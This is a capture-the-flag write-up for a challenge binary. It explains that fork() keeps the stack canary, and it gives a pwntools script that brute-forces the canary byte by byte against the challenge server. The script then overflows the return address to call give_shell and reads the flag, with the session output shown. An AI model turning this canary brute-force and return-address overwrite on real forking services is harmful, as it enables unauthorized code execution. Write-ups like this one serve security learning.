![Alt text](image.png)

# 8 ^ 256 

--- Hello, welcome to my little forking binary I made it special just for you I hope you don't disappoint me.

the trick is that a fork doesn't change the canary, so you can bruteforce it byte by byte
``` python
from pwn import *

e = ELF("./canary_patched")
context.binary = e

'''
Hello, welcome to my little forking binary
I made it special just for you
I hope you don't disappoint me.

Forked proccess...
I am the forked process!
How much data would you like to read?
'''

def get_con():
    if args.REMOTE:
        #  nc 0.cloud.chals.io 27190 
        p = remote('0.cloud.chals.io', 27190)
    else:
        if args.GDB:
            p = gdb.debug([e.path], '''
            # ---< Your gdb script here >---
            continue
            ''', aslr=False)
        else:
            p = process([e.path])
    return p


def trial(p, buffer) -> bool:
    n = len(buffer)
    p.sendlineafter(b"How much data would you like to read?\n", str(n).encode())
    p.sendlineafter(b"data\n", buffer)
    p.recvuntil(b"Exiting...\n")
    # did the binary crash or exit cleanly?
    data = p.recvline()
    return b"success" in data
    
# Good luck, you've got this!

p = get_con()

assert trial(p, b"A"*0x80)
assert not trial(p, b"A"*0x81)

canary = b"\0"
for i in range(3):
    flag = False
    for j in range(256):
        buf = b"A"*0x80 + canary + bytes([j])
        if trial(p, buf):
            canary += bytes([j])
            flag = True
            print(canary)
            break
    assert flag
    buf = b"A"*0x80 + canary
    assert trial(p, buf), "Could not reproduce canary " + str(buf)

buf = b"A"*0x80 + canary +  p32(e.symbols['give_shell'])*20

p.sendlineafter(b"How much data would you like to read?\n", str(len(buf)).encode())
p.sendlineafter(b"data\n", buf)

p.interactive()

'''
[+] Opening connection to 0.cloud.chals.io on port 27190: Done
b'\x00\xfc'
b'\x00\xfc\xa0'
b'\x00\xfc\xa0\x99'
[*] Switching to interactive mode
Exiting...
```
```
$ $ ls
```


canary    canary.c  flag.txt

```
$ $ cat flag.txt
```

## flag{but_is_it_cookie_or_canary_though}
$ $  

'